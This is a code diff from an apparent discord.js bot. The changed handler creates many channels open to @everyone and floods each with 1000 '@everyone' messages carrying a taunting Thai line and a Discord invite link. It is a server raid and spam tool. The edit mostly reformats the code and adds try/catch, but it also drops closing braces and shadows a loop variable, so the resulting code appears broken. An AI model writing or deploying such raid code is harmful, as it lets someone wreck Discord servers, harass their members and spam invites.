@@ -369,27 +369,28 @@ client.on("interactionCreate", async (interaction) => {
       const tasks = [];
       for (let i = 0; i < amount; i++) {
         const name = roomNames[Math.floor(Math.random()*roomNames.length)];
-        tasks.push(
-          interaction.guild.channels.create({
-            name,
-            type: ChannelType.GuildText,
-            permissionOverwrites:[{
-              id: interaction.guild.roles.everyone.id,
-              allow:[
-                PermissionsBitField.Flags.ViewChannel,
-                PermissionsBitField.Flags.SendMessages
-              ]
-            }],
-          }).then(ch=>{
-            for (let j = 0; j < 1000; j++)
-              ch.send("@everyone ไม่เป็นไรนะสร้างใหม่ได้โอ๋ๆ https://discord.gg/bdtRJBRyem")
-                .catch(()=>{});
-          }).catch(()=>{})
-        );
+        try {
+  tasks.push(
+    interaction.guild.channels.create({
+      name,
+      type: ChannelType.GuildText,
+      permissionOverwrites: [{
+        id: interaction.guild.roles.everyone.id,
+        allow: [
+          PermissionsBitField.Flags.ViewChannel,
+          PermissionsBitField.Flags.SendMessages
+        ]
+      }],
+    }).then(ch => {
+      for (let i = 0; i < 1000; i++) {
+        ch.send("@everyone ไม่เป็นไรนะสร้างใหม่ได้ โอ๋ๆ https://discord.gg/bdtRJBryem")
+          .catch(() => {});
       }
-      }
-      }
-      }
+    }).catch(() => {})
+  );
+} catch (err) {
+  console.error("ERROR:", err);
+}
 
 client.on("interactionCreate", async (interaction) => {
   if (interaction.commandName === "create_room") {
